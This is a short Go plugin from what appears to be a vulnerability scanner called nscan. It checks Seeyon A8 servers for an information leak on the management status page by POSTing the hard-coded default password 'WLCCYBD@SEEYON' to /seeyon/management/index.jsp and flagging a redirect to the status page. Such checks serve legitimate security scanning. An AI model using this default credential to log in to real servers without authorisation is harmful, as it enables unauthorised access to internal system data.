package seeyon

import (
	"fmt"
	"nscan/plugins/log"
	"nscan/utils"
	"strings"
)

//A8 状态监控页面信息泄露

func ManagementStatus(u string) bool {
	if req, err := utils.HttpRequset(u+"/seeyon/management/index.jsp", "POST", "password=WLCCYBD@SEEYON", false, nil); err == nil {
		if req.StatusCode == 302 && strings.Contains(req.Location, "status") {
			log.Logger.Warn().Msg(fmt.Sprintf("Found vuln seeyon ManagementStatus|pssword:WLCCYBD@SEEYON|%s\n", u+"/seeyon/management/index.jsp"))
			return true
		}
	}
	return false
}
